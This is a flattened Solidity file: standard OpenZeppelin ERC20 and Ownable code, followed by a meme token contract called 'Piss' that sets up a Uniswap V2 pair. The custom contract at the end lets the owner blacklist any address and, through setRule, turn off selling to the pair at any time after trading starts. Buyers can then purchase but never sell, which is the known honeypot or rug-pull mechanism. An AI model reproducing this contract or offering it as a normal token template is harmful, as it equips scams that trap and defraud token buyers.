1 // OpenZeppelin Contracts (last updated v4.7.0) (access/Ownable.sol)
2 
3 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
4 
5 /**
6  * @dev Provides information about the current execution context, including the
7  * sender of the transaction and its data. While these are generally available
8  * via msg.sender and msg.data, they should not be accessed in such a direct
9  * manner, since when dealing with meta-transactions the account sending and
10  * paying for execution may not be the actual sender (as far as an application
11  * is concerned).
12  *
13  * This contract is only required for intermediate, library-like contracts.
14  */
15 abstract contract Context {
16     function _msgSender() internal view virtual returns (address) {
17         return msg.sender;
18     }
19 
20     function _msgData() internal view virtual returns (bytes calldata) {
21         return msg.data;
22     }
23 }
24 
25 /**
26  * @dev Contract module which provides a basic access control mechanism, where
27  * there is an account (an owner) that can be granted exclusive access to
28  * specific functions.
29  *
30  * By default, the owner account will be the one that deploys the contract. This
31  * can later be changed with {transferOwnership}.
32  *
33  * This module is used through inheritance. It will make available the modifier
34  * `onlyOwner`, which can be applied to your functions to restrict their use to
35  * the owner.
36  */
37 abstract contract Ownable is Context {
38     address private _owner;
39 
40     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
41 
42     /**
43      * @dev Initializes the contract setting the deployer as the initial owner.
44      */
45     constructor() {
46         _transferOwnership(_msgSender());
47     }
48 
49     /**
50      * @dev Throws if called by any account other than the owner.
51      */
52     modifier onlyOwner() {
53         _checkOwner();
54         _;
55     }
56 
57     /**
58      * @dev Returns the address of the current owner.
59      */
60     function owner() public view virtual returns (address) {
61         return _owner;
62     }
63 
64     /**
65      * @dev Throws if the sender is not the owner.
66      */
67     function _checkOwner() internal view virtual {
68         require(owner() == _msgSender(), "Ownable: caller is not the owner");
69     }
70 
71     /**
72      * @dev Leaves the contract without owner. It will not be possible to call
73      * `onlyOwner` functions anymore. Can only be called by the current owner.
74      *
75      * NOTE: Renouncing ownership will leave the contract without an owner,
76      * thereby removing any functionality that is only available to the owner.
77      */
78     function renounceOwnership() public virtual onlyOwner {
79         _transferOwnership(address(0));
80     }
81 
82     /**
83      * @dev Transfers ownership of the contract to a new account (`newOwner`).
84      * Can only be called by the current owner.
85      */
86     function transferOwnership(address newOwner) public virtual onlyOwner {
87         require(newOwner != address(0), "Ownable: new owner is the zero address");
88         _transferOwnership(newOwner);
89     }
90 
91     /**
92      * @dev Transfers ownership of the contract to a new account (`newOwner`).
93      * Internal function without access restriction.
94      */
95     function _transferOwnership(address newOwner) internal virtual {
96         address oldOwner = _owner;
97         _owner = newOwner;
98         emit OwnershipTransferred(oldOwner, newOwner);
99     }
100 }
101 
102 // OpenZeppelin Contracts (last updated v4.8.0) (token/ERC20/ERC20.sol)
103 
104 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)
105 
106 /**
107  * @dev Interface of the ERC20 standard as defined in the EIP.
108  */
109 interface IERC20 {
110     /**
111      * @dev Emitted when `value` tokens are moved from one account (`from`) to
112      * another (`to`).
113      *
114      * Note that `value` may be zero.
115      */
116     event Transfer(address indexed from, address indexed to, uint256 value);
117 
118     /**
119      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
120      * a call to {approve}. `value` is the new allowance.
121      */
122     event Approval(address indexed owner, address indexed spender, uint256 value);
123 
124     /**
125      * @dev Returns the amount of tokens in existence.
126      */
127     function totalSupply() external view returns (uint256);
128 
129     /**
130      * @dev Returns the amount of tokens owned by `account`.
131      */
132     function balanceOf(address account) external view returns (uint256);
133 
134     /**
135      * @dev Moves `amount` tokens from the caller's account to `to`.
136      *
137      * Returns a boolean value indicating whether the operation succeeded.
138      *
139      * Emits a {Transfer} event.
140      */
141     function transfer(address to, uint256 amount) external returns (bool);
142 
143     /**
144      * @dev Returns the remaining number of tokens that `spender` will be
145      * allowed to spend on behalf of `owner` through {transferFrom}. This is
146      * zero by default.
147      *
148      * This value changes when {approve} or {transferFrom} are called.
149      */
150     function allowance(address owner, address spender) external view returns (uint256);
151 
152     /**
153      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
154      *
155      * Returns a boolean value indicating whether the operation succeeded.
156      *
157      * IMPORTANT: Beware that changing an allowance with this method brings the risk
158      * that someone may use both the old and the new allowance by unfortunate
159      * transaction ordering. One possible solution to mitigate this race
160      * condition is to first reduce the spender's allowance to 0 and set the
161      * desired value afterwards:
162      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
163      *
164      * Emits an {Approval} event.
165      */
166     function approve(address spender, uint256 amount) external returns (bool);
167 
168     /**
169      * @dev Moves `amount` tokens from `from` to `to` using the
170      * allowance mechanism. `amount` is then deducted from the caller's
171      * allowance.
172      *
173      * Returns a boolean value indicating whether the operation succeeded.
174      *
175      * Emits a {Transfer} event.
176      */
177     function transferFrom(
178         address from,
179         address to,
180         uint256 amount
181     ) external returns (bool);
182 }
183 
184 // OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)
185 
186 /**
187  * @dev Interface for the optional metadata functions from the ERC20 standard.
188  *
189  * _Available since v4.1._
190  */
191 interface IERC20Metadata is IERC20 {
192     /**
193      * @dev Returns the name of the token.
194      */
195     function name() external view returns (string memory);
196 
197     /**
198      * @dev Returns the symbol of the token.
199      */
200     function symbol() external view returns (string memory);
201 
202     /**
203      * @dev Returns the decimals places of the token.
204      */
205     function decimals() external view returns (uint8);
206 }
207 
208 /**
209  * @dev Implementation of the {IERC20} interface.
210  *
211  * This implementation is agnostic to the way tokens are created. This means
212  * that a supply mechanism has to be added in a derived contract using {_mint}.
213  * For a generic mechanism see {ERC20PresetMinterPauser}.
214  *
215  * TIP: For a detailed writeup see our guide
216  * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
217  * to implement supply mechanisms].
218  *
219  * We have followed general OpenZeppelin Contracts guidelines: functions revert
220  * instead returning `false` on failure. This behavior is nonetheless
221  * conventional and does not conflict with the expectations of ERC20
222  * applications.
223  *
224  * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
225  * This allows applications to reconstruct the allowance for all accounts just
226  * by listening to said events. Other implementations of the EIP may not emit
227  * these events, as it isn't required by the specification.
228  *
229  * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
230  * functions have been added to mitigate the well-known issues around setting
231  * allowances. See {IERC20-approve}.
232  */
233 contract ERC20 is Context, IERC20, IERC20Metadata {
234     mapping(address => uint256) private _balances;
235 
236     mapping(address => mapping(address => uint256)) private _allowances;
237 
238     uint256 private _totalSupply;
239 
240     string private _name;
241     string private _symbol;
242 
243     /**
244      * @dev Sets the values for {name} and {symbol}.
245      *
246      * The default value of {decimals} is 18. To select a different value for
247      * {decimals} you should overload it.
248      *
249      * All two of these values are immutable: they can only be set once during
250      * construction.
251      */
252     constructor(string memory name_, string memory symbol_) {
253         _name = name_;
254         _symbol = symbol_;
255     }
256 
257     /**
258      * @dev Returns the name of the token.
259      */
260     function name() public view virtual override returns (string memory) {
261         return _name;
262     }
263 
264     /**
265      * @dev Returns the symbol of the token, usually a shorter version of the
266      * name.
267      */
268     function symbol() public view virtual override returns (string memory) {
269         return _symbol;
270     }
271 
272     /**
273      * @dev Returns the number of decimals used to get its user representation.
274      * For example, if `decimals` equals `2`, a balance of `505` tokens should
275      * be displayed to a user as `5.05` (`505 / 10 ** 2`).
276      *
277      * Tokens usually opt for a value of 18, imitating the relationship between
278      * Ether and Wei. This is the value {ERC20} uses, unless this function is
279      * overridden;
280      *
281      * NOTE: This information is only used for _display_ purposes: it in
282      * no way affects any of the arithmetic of the contract, including
283      * {IERC20-balanceOf} and {IERC20-transfer}.
284      */
285     function decimals() public view virtual override returns (uint8) {
286         return 18;
287     }
288 
289     /**
290      * @dev See {IERC20-totalSupply}.
291      */
292     function totalSupply() public view virtual override returns (uint256) {
293         return _totalSupply;
294     }
295 
296     /**
297      * @dev See {IERC20-balanceOf}.
298      */
299     function balanceOf(address account) public view virtual override returns (uint256) {
300         return _balances[account];
301     }
302 
303     /**
304      * @dev See {IERC20-transfer}.
305      *
306      * Requirements:
307      *
308      * - `to` cannot be the zero address.
309      * - the caller must have a balance of at least `amount`.
310      */
311     function transfer(address to, uint256 amount) public virtual override returns (bool) {
312         address owner = _msgSender();
313         _transfer(owner, to, amount);
314         return true;
315     }
316 
317     /**
318      * @dev See {IERC20-allowance}.
319      */
320     function allowance(address owner, address spender) public view virtual override returns (uint256) {
321         return _allowances[owner][spender];
322     }
323 
324     /**
325      * @dev See {IERC20-approve}.
326      *
327      * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
328      * `transferFrom`. This is semantically equivalent to an infinite approval.
329      *
330      * Requirements:
331      *
332      * - `spender` cannot be the zero address.
333      */
334     function approve(address spender, uint256 amount) public virtual override returns (bool) {
335         address owner = _msgSender();
336         _approve(owner, spender, amount);
337         return true;
338     }
339 
340     /**
341      * @dev See {IERC20-transferFrom}.
342      *
343      * Emits an {Approval} event indicating the updated allowance. This is not
344      * required by the EIP. See the note at the beginning of {ERC20}.
345      *
346      * NOTE: Does not update the allowance if the current allowance
347      * is the maximum `uint256`.
348      *
349      * Requirements:
350      *
351      * - `from` and `to` cannot be the zero address.
352      * - `from` must have a balance of at least `amount`.
353      * - the caller must have allowance for ``from``'s tokens of at least
354      * `amount`.
355      */
356     function transferFrom(
357         address from,
358         address to,
359         uint256 amount
360     ) public virtual override returns (bool) {
361         address spender = _msgSender();
362         _spendAllowance(from, spender, amount);
363         _transfer(from, to, amount);
364         return true;
365     }
366 
367     /**
368      * @dev Atomically increases the allowance granted to `spender` by the caller.
369      *
370      * This is an alternative to {approve} that can be used as a mitigation for
371      * problems described in {IERC20-approve}.
372      *
373      * Emits an {Approval} event indicating the updated allowance.
374      *
375      * Requirements:
376      *
377      * - `spender` cannot be the zero address.
378      */
379     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
380         address owner = _msgSender();
381         _approve(owner, spender, allowance(owner, spender) + addedValue);
382         return true;
383     }
384 
385     /**
386      * @dev Atomically decreases the allowance granted to `spender` by the caller.
387      *
388      * This is an alternative to {approve} that can be used as a mitigation for
389      * problems described in {IERC20-approve}.
390      *
391      * Emits an {Approval} event indicating the updated allowance.
392      *
393      * Requirements:
394      *
395      * - `spender` cannot be the zero address.
396      * - `spender` must have allowance for the caller of at least
397      * `subtractedValue`.
398      */
399     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
400         address owner = _msgSender();
401         uint256 currentAllowance = allowance(owner, spender);
402         require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
403         unchecked {
404             _approve(owner, spender, currentAllowance - subtractedValue);
405         }
406 
407         return true;
408     }
409 
410     /**
411      * @dev Moves `amount` of tokens from `from` to `to`.
412      *
413      * This internal function is equivalent to {transfer}, and can be used to
414      * e.g. implement automatic token fees, slashing mechanisms, etc.
415      *
416      * Emits a {Transfer} event.
417      *
418      * Requirements:
419      *
420      * - `from` cannot be the zero address.
421      * - `to` cannot be the zero address.
422      * - `from` must have a balance of at least `amount`.
423      */
424     function _transfer(
425         address from,
426         address to,
427         uint256 amount
428     ) internal virtual {
429         require(from != address(0), "ERC20: transfer from the zero address");
430         require(to != address(0), "ERC20: transfer to the zero address");
431 
432         _beforeTokenTransfer(from, to, amount);
433 
434         uint256 fromBalance = _balances[from];
435         require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
436         unchecked {
437             _balances[from] = fromBalance - amount;
438             // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
439             // decrementing then incrementing.
440             _balances[to] += amount;
441         }
442 
443         emit Transfer(from, to, amount);
444 
445         _afterTokenTransfer(from, to, amount);
446     }
447 
448     /** @dev Creates `amount` tokens and assigns them to `account`, increasing
449      * the total supply.
450      *
451      * Emits a {Transfer} event with `from` set to the zero address.
452      *
453      * Requirements:
454      *
455      * - `account` cannot be the zero address.
456      */
457     function _mint(address account, uint256 amount) internal virtual {
458         require(account != address(0), "ERC20: mint to the zero address");
459 
460         _beforeTokenTransfer(address(0), account, amount);
461 
462         _totalSupply += amount;
463         unchecked {
464             // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
465             _balances[account] += amount;
466         }
467         emit Transfer(address(0), account, amount);
468 
469         _afterTokenTransfer(address(0), account, amount);
470     }
471 
472     /**
473      * @dev Destroys `amount` tokens from `account`, reducing the
474      * total supply.
475      *
476      * Emits a {Transfer} event with `to` set to the zero address.
477      *
478      * Requirements:
479      *
480      * - `account` cannot be the zero address.
481      * - `account` must have at least `amount` tokens.
482      */
483     function _burn(address account, uint256 amount) internal virtual {
484         require(account != address(0), "ERC20: burn from the zero address");
485 
486         _beforeTokenTransfer(account, address(0), amount);
487 
488         uint256 accountBalance = _balances[account];
489         require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
490         unchecked {
491             _balances[account] = accountBalance - amount;
492             // Overflow not possible: amount <= accountBalance <= totalSupply.
493             _totalSupply -= amount;
494         }
495 
496         emit Transfer(account, address(0), amount);
497 
498         _afterTokenTransfer(account, address(0), amount);
499     }
500 
501     /**
502      * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
503      *
504      * This internal function is equivalent to `approve`, and can be used to
505      * e.g. set automatic allowances for certain subsystems, etc.
506      *
507      * Emits an {Approval} event.
508      *
509      * Requirements:
510      *
511      * - `owner` cannot be the zero address.
512      * - `spender` cannot be the zero address.
513      */
514     function _approve(
515         address owner,
516         address spender,
517         uint256 amount
518     ) internal virtual {
519         require(owner != address(0), "ERC20: approve from the zero address");
520         require(spender != address(0), "ERC20: approve to the zero address");
521 
522         _allowances[owner][spender] = amount;
523         emit Approval(owner, spender, amount);
524     }
525 
526     /**
527      * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
528      *
529      * Does not update the allowance amount in case of infinite allowance.
530      * Revert if not enough allowance is available.
531      *
532      * Might emit an {Approval} event.
533      */
534     function _spendAllowance(
535         address owner,
536         address spender,
537         uint256 amount
538     ) internal virtual {
539         uint256 currentAllowance = allowance(owner, spender);
540         if (currentAllowance != type(uint256).max) {
541             require(currentAllowance >= amount, "ERC20: insufficient allowance");
542             unchecked {
543                 _approve(owner, spender, currentAllowance - amount);
544             }
545         }
546     }
547 
548     /**
549      * @dev Hook that is called before any transfer of tokens. This includes
550      * minting and burning.
551      *
552      * Calling conditions:
553      *
554      * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
555      * will be transferred to `to`.
556      * - when `from` is zero, `amount` tokens will be minted for `to`.
557      * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
558      * - `from` and `to` are never both zero.
559      *
560      * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
561      */
562     function _beforeTokenTransfer(
563         address from,
564         address to,
565         uint256 amount
566     ) internal virtual {}
567 
568     /**
569      * @dev Hook that is called after any transfer of tokens. This includes
570      * minting and burning.
571      *
572      * Calling conditions:
573      *
574      * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
575      * has been transferred to `to`.
576      * - when `from` is zero, `amount` tokens have been minted for `to`.
577      * - when `to` is zero, `amount` of ``from``'s tokens have been burned.
578      * - `from` and `to` are never both zero.
579      *
580      * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
581      */
582     function _afterTokenTransfer(
583         address from,
584         address to,
585         uint256 amount
586     ) internal virtual {}
587 }
588 
589 pragma solidity ^0.8.0;
590 
591 interface IUniswapV2Factory {
592     function createPair(
593         address tokenA,
594         address tokenB
595     ) external returns (address pair);
596 }
597 
598 interface IUniswapV2Router02 {
599     function swapExactTokensForETHSupportingFeeOnTransferTokens(
600         uint amountIn,
601         uint amountOutMin,
602         address[] calldata path,
603         address to,
604         uint deadline
605     ) external;
606 
607     function factory() external pure returns (address);
608 
609     function WETH() external pure returns (address);
610 
611     function addLiquidityETH(
612         address token,
613         uint amountTokenDesired,
614         uint amountTokenMin,
615         uint amountETHMin,
616         address to,
617         uint deadline
618     )
619         external
620         payable
621         returns (uint amountToken, uint amountETH, uint liquidity);
622 }
623 
624 contract Piss is ERC20, Ownable {
625     address public pair;
626     uint256 public maxHoldingAmount;
627     bool public tradingOn = false;
628     bool public sellingOn = false;
629     bool public limitOn = true;
630     mapping(address => bool) public blacklist;
631 
632     constructor(uint256 _totalSupply) ERC20("Piss", "PISS") {
633         _mint(msg.sender, _totalSupply);
634         maxHoldingAmount = _totalSupply / 100;
635         address ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
636         address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
637         pair = IUniswapV2Factory(IUniswapV2Router02(ROUTER).factory())
638             .createPair(WETH, address(this));
639     }
640 
641     function setBlacklist(
642         address _address,
643         bool _isBlacklisted
644     ) external onlyOwner {
645         blacklist[_address] = _isBlacklisted;
646     }
647 
648     function setRule(
649         bool _tradingOn,
650         bool _sellingOn,
651         bool _limitOn,
652         uint256 _maxHoldingAmount
653     ) external onlyOwner {
654         tradingOn = _tradingOn;
655         sellingOn = _sellingOn;
656         limitOn = _limitOn;
657         maxHoldingAmount = _maxHoldingAmount;
658     }
659 
660     function _beforeTokenTransfer(
661         address from,
662         address to,
663         uint256 amount
664     ) internal virtual override {
665         require(!blacklist[to] && !blacklist[from], "Blacklisted");
666         if (!tradingOn) {
667             require(from == owner() || to == owner(), "Trading not enabled");
668         } else {
669             require(sellingOn || to != pair, "Selling not enabled");
670             if (limitOn && from == pair) {
671                 require(
672                     super.balanceOf(to) + amount <= maxHoldingAmount,
673                     "Max holding amount exceeded"
674                 );
675             }
676         }
677     }
678 }
